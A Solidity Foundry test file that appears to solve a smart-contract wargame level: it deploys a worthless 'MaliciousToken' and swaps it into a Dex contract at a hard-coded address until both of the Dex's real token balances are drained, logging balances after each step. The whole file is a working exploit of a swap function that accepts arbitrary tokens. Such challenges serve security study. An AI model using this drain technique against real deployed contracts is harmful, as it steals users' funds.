// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Dex.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
contract MaliciousToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) public {
        _mint(msg.sender, 1000);
    }
}
contract DexTest is DSTest {
    Dex obj;
    MaliciousToken mal_token;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address contract_address;
    function setUp() public {  
        contract_address = 0x480D75251872BA045Ab5517E902D6817FF6FCBec;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        vm.startPrank(player_address);
        obj = Dex(contract_address);
        mal_token = new MaliciousToken("Malicious Token", "MTK");
        console.log("contract address =", address(obj));
        console.log("Mal token address =", address(mal_token));        
    }

    function testDrainToken0AndToken1() public {
        address token1 = obj.token1();
        address token2 = obj.token2();
        address token3 = address(mal_token);
        vm.label(token1, "token1");
        vm.label(token2, "token2");
        vm.label(token3, "token3");
        vm.label(contract_address, "contract_address");
        vm.label(player_address, "player_address");

        mal_token.transfer(contract_address, 100);
        
        uint256 t1 = obj.balanceOf(token1, contract_address);
        uint256 t2 = obj.balanceOf(token2, contract_address);
        uint256 t3 = obj.balanceOf(token3, contract_address);
        uint256 p1 = obj.balanceOf(token1, player_address);
        uint256 p2 = obj.balanceOf(token2, player_address);
        uint256 p3 = obj.balanceOf(token3, player_address);
        
        console.log("token1 =", t1);
        console.log("token2 =", t2);
        console.log("token3 =", t3);
    
        console.log("player token1 =", p1);
        console.log("player token2 =", p2);
        console.log("player token3 =", p3);

        mal_token.approve(contract_address, 100);
        obj.swap(token3, token1, 100);

        console.log("After swap");
        t1 = obj.balanceOf(token1, contract_address);
        t2 = obj.balanceOf(token2, contract_address);
        t3 = obj.balanceOf(token3, contract_address);
        p1 = obj.balanceOf(token1, player_address);
        p2 = obj.balanceOf(token2, player_address);
        p3 = obj.balanceOf(token3, player_address);
        
        console.log("token1 =", t1);
        console.log("token2 =", t2);
        console.log("token3 =", t3);
    
        console.log("player token1 =", p1);
        console.log("player token2 =", p2);
        console.log("player token3 =", p3);

        mal_token.approve(contract_address, 200);
        obj.swap(token3, token2, 200);

        console.log("After swap");
        t1 = obj.balanceOf(token1, contract_address);
        t2 = obj.balanceOf(token2, contract_address);
        t3 = obj.balanceOf(token3, contract_address);
        p1 = obj.balanceOf(token1, player_address);
        p2 = obj.balanceOf(token2, player_address);
        p3 = obj.balanceOf(token3, player_address);
        
        console.log("token1 =", t1);
        console.log("token2 =", t2);
        console.log("token3 =", t3);
    
        console.log("player token1 =", p1);
        console.log("player token2 =", p2);
        console.log("player token3 =", p3);
        assert(t1 == 0 && t2 == 0);
    }
}
